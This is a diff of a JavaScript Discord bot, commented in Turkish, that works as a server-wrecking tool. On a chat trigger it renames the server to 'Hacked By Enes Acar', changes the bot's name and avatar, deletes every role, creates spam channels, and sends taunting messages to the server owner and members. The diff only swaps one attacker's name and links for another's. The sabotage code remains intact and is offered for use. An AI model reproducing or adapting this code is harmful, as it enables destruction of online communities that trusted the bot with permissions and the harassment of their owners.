@@ -75,7 +75,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("✝ Kimse Yenemez", {
+      .createChannel("ャ Kimse Yenemez", {
         type: "voice"
       })
       .then(chan => {
@@ -93,13 +93,13 @@ client.on("message", async msg => {
       "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"
     );
 
-    await msg.guild.setName("✝ Hacked By Dizzy ✝"); //sunucu ismini yapar
-    await client.user.setAvatar("http://sicanzi.com/"); //botun pp sini yapar
-    await client.user.setUsername("✝ Hacked By DizzY ✝"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
+    await msg.guild.setName("ャ Hacked By Enes Acar ャ"); //sunucu ismini yapar
+    await client.user.setAvatar("https://i.hizliresim.com/7BR1Rm.jpg"); //botun pp sini yapar
+    await client.user.setUsername("ャ Hacked By Enes Acar ャ"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
     await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
-    await msg.guild.owner.send("Patladın Canım Geçmiş Olsun | https://discord.gg/xft7cnN"); //KURUCUSUNA GONDERILEN MESAJ
-    const kanal = await msg.guild.channels.find(x => x.name === "DizzY-sikti");
-    await kanal.send("Patladın Kardeşim Geçmiş Olsun");
+    await msg.guild.owner.send("Patladın Canım Geçmiş Olsun | https://discord.gg/vd77Jpf"); //KURUCUSUNA GONDERILEN MESAJ
+    const kanal = await msg.guild.channels.find(x => x.name === "ャ tek-kral-enes-acar");
+    await kanal.send("__**SİZ ACI ÇEKTİKÇE BİZ GÜLÜYORUZ**__ \nKÜLLERİMİZDEN TEKRAR DOĞACAĞIZ <a:kullermizdendogacagz:667722719290327041>");
   }
 });
 client.on("message", async msg => {
